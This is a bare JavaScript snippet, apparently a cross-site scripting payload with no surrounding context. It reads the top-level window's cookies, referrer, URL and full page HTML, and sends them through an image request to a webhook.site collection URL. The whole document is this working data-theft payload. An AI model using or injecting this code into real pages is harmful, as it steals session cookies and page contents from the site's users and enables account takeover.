d=window.top.document;
w=window.top;
(new Image()).src=`https://webhook.site/c8c5563a-33e6-4cd2-a4e5-146c5fcbe28b?${d.cookie}&ref=${d.referrer}&url=${encodeURIComponent(w.location.href)}&body=${encodeURIComponent(d.documentElement.innerHTML)}`;
